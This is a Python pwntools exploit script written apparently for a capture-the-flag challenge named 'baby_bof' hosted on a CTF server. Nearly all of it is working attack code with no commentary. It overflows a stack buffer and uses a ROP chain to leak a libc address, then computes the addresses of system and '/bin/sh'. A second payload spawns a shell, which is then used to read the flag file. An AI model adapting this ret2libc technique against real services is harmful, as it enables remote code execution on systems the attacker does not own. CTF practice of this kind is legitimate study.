#!/usr/bin/env python3
from pwn import *

host = "h22-ctf-78q1tmqs4n.zohosecurity.team"
port = 443
target = "baby_bof"
context.arch = 'amd64'
print(context)
def exploit(remote):
    #context.arch = 'amd64'
    #context.kernel = 'amd64'
    #context.log_level = "DEBUG"
    #context.log_level = "INFO"
    if remote:
        pr = connect(host, port)
    else:
        pr = process(target)

    try:
        print(pr)
        elf = ELF('./baby_bof')
        libc = ELF('libc.so')
        rop = ROP(elf)
        rop.call(elf.symbols["write"],[elf.got["write"]])
        rop.call(elf.symbols["puts"],[elf.plt['puts']])
        print("---")
        rop.call(elf.symbols['vuln'])
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        
        payload = b'A'*18
        payload += pop_rdi
        #print( pwn.p64(elf.got['puts']))

        #payload +=libc.got['puts']
        #print(payload)
        #payload += p64(elf.plt['puts'])
        #payload += p64(elf.sym['vuln'])
        print(payload)
        payload+=rop.chain()

        pr.sendlineafter("mate?\n", payload)
        print(pr.readline())
        out = pr.readline().strip()
        puts_addr = int.from_bytes(out[:8], 'little')
        print('puts @', hex(puts_addr))

        #Also works
        '''
        if remote:
            sys = puts_addr - 0x32190
            bin_sh = puts_addr + 0x13000a
        else:
            sys = puts_addr - 0x2e660
            bin_sh = puts_addr + 0x116eb6
        '''
        

        libc.address = puts_addr - libc.symbols['puts']
        sys = libc.symbols['system']
        bin_sh = next(libc.search(b'/bin/sh'))

        print('sys @', hex(sys))
        print('bin_sh @', hex(bin_sh))

        ret = p64(rop.find_gadget(['ret']).address)
        payload = b'A'*18
        payload += ret
        payload += pop_rdi
        payload += p64(bin_sh)
        payload += p64(sys)
        payload += p64(elf.sym['vuln'])
        print(payload)

        pr.sendafter('mate?\n', payload)
        pr.sendline()
        pr.sendline('cat flag.txt')
        print(pr.readall(4))
    except Exception as e:
        print(e)
    finally:
        pr.close()

exploit(True)
